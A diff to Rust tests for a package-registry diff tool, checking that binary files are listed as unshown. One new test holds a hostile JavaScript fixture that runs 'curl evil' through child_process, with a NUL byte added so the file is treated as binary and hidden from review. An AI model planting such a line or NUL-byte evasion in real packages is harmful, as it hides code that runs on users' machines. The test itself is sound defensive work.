@@ -200,17 +200,36 @@ fn a_go_modules_versioned_directory_does_not_read_as_a_rewrite() {
     assert!(text(&d.diff).contains("a/b.go"), "{}", text(&d.diff));
 }
 
+fn unshown(d: &registry::PackageDiff) -> Vec<String> {
+    let names = serde_json::to_value(&d.unshown).unwrap();
+    serde_json::from_value(names["$untrusted"].clone()).unwrap()
+}
+
 #[test]
-fn a_binary_file_is_named_and_not_shown() {
+fn a_binary_file_is_reported_and_not_shown() {
     let old = module_zip("v1.0.0", &[("data.bin", "old\0bytes"), ("a.go", "old")]);
     let new = module_zip("v1.0.1", &[("data.bin", "new\0bytes"), ("a.go", "new")]);
     let d = diff_archives(&old, &new, OK).unwrap();
-    let shown = text(&d.diff);
     assert_eq!(d.files_changed, 2);
-    assert!(
-        shown.contains("Binary file changed, and not shown: data.bin"),
-        "{shown}"
-    );
-    assert!(!shown.contains("bytes"), "{shown}");
-    assert!(shown.contains("a/a.go"), "{shown}");
+    assert_eq!(unshown(&d), ["data.bin"]);
+    assert!(!text(&d.diff).contains("bytes"), "{}", text(&d.diff));
+    assert!(text(&d.diff).contains("a/a.go"), "{}", text(&d.diff));
+}
+
+/// One byte makes a source file binary here, and Node runs it regardless.
+#[test]
+fn a_nul_cannot_hide_a_source_file_from_the_verdict() {
+    let old = module_zip("v1.0.0", &[("index.js", "console.log(1);\n")]);
+    let evil = "require('child_process').exec('curl evil');// \0\n";
+    let new = module_zip("v1.0.1", &[("index.js", evil)]);
+    let d = diff_archives(&old, &new, OK).unwrap();
+    assert_eq!(unshown(&d), ["index.js"]);
+}
+
+#[test]
+fn a_new_binary_file_is_reported() {
+    let old = module_zip("v1.0.0", &[("a.go", "same")]);
+    let new = module_zip("v1.0.1", &[("a.go", "same"), ("payload.bin", "\0")]);
+    let d = diff_archives(&old, &new, OK).unwrap();
+    assert_eq!(unshown(&d), ["payload.bin"]);
 }
